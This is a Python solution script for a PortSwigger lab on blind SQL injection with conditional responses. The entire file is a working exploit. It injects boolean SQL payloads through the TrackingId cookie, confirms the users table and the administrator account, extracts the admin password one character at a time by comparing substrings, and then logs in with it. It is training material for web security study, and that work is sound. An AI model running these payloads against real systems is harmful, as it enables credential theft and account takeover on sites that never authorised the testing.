#!/usr/bin/env python3
# Lab: Blind SQL injection with conditional responses
# Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses>
# Difficulty: PRACTITIONER
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
client = None
tracking_cookie = None
host = None
url = None


def send_request(payload):
    client.cookies.set('TrackingId', f'{tracking_cookie}{payload}', domain=f'{host[8:]}')
    r = client.get(f"{host}{url}")
    if 'Welcome back!' in r.text:
        return True
    return False


def obtain_tracking_cookie():
    global tracking_cookie

    client.get(f'{host}{url}')
    tracking_cookie = client.cookies.get('TrackingId')
    if tracking_cookie:
        print(f'[+] Found Tracking Cookie: {tracking_cookie}')
    else:
        print(f'[-] Failed to obtain Tracking Cookie')
        sys.exit(-2)


def verify_setup():
    if not send_request("' AND 1=1--"):
        print(f'[-] Failed to verfiy TRUE statement')
        sys.exit(-2)
    print(f'[+] Verified TRUE statement')

    if send_request("' AND 1=2--"):
        print(f'[-] Failed to verfiy FALSE statement')
        sys.exit(-2)
    print(f'[+] Verified FALSE statement')

    if not send_request("' AND (SELECT 'x' FROM users LIMIT 1)='x'--"):
        print(f'[-] Did not find correct users table')
        sys.exit(-3)
    print(f'[+] Confirmed table: users')

    if not send_request("' AND (SELECT username FROM users WHERE username='administrator')='administrator'--"):
        print(f'[-] Did not find user administrator')
        sys.exit(-4)
    print(f'[+] Confirmed column: username; user: administrator')


def get_password_length():
    for i in range(1, 101):
        if send_request(f"' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)={i})='administrator'--"):
            return i
    print(f'[-] Failed to find password length')
    sys.exit(-4)


def get_admin_password(length):
    password = ''
    print(f'[ ] Enumerating administrator password. This takes {length*(126-32)} requests, so might take a while')
    sys.stdout.write('\r[ ] Current extraction status: ')
    sys.stdout.flush()
    for i in range(1, length + 1):
        for j in range(32, 126 + 1):
            if send_request(f"' AND (SELECT substring(password, {i}, 1) FROM users WHERE username='administrator')='{chr(j)}'--"):
                password += chr(j)
                break
        sys.stdout.write('\r[ ] Current extraction status: ' + password)
        sys.stdout.flush()

    if len(password) == length:
        print()
        return password

    print(f'[-] Failed to find administrator password, extracted only {len(password)} characters, expected {length}')
    sys.exit(-5)


def login(host, password):
    def get_csrf_token(client, url):
        r = client.get(url)
        soup = BeautifulSoup(r.text, 'html.parser')
        return soup.find('input', attrs={'name': 'csrf'})['value']
    client = requests.Session()
    client.proxies = proxies
    client.verify = False

    url = f"{host}/login"
    csrf = get_csrf_token(client, url)
    if not csrf:
        print(f'[-] Unable to obtain csrf token')
        sys.exit(-2)

    payload = {'csrf': csrf,
               'username': 'administrator',
               'password': password}
    r = client.post(url, data=payload, allow_redirects=True)
    return 'Congratulations, you solved the lab!' in r.text


if __name__ == '__main__':
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <HOST>')
        print(f'[-] Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    url = '/filter?category=X'

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies
        obtain_tracking_cookie()
        verify_setup()

        password_length = get_password_length()
        print(f'[+] Found password length: {password_length}')

        admin_password = get_admin_password(password_length)
        print(f'[+] Found administrator password: {admin_password}')

        print('[ ] Try to login as administrator')
        if login(host, admin_password):
            print('[+] Login as administrator successful')
        else:
            print('[-] Failed to login as administrator')
